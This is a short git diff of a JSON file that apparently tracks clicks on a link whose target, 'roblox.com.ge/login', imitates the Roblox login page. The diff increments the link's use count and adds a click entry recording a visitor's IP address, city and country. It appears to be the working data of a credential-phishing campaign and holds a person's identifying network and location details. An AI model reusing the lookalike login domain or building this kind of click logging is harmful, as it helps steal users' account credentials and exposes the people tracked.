@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1575,
+    "useCount": 1576,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12768,6 +12768,14 @@
         "city": "Wonogiri",
         "flag": "🇮🇩",
         "countryCode": "ID"
+      },
+      {
+        "timestamp": 1777455523552,
+        "ip": "112.203.48.189",
+        "country": "Philippines",
+        "city": "Caloocan",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
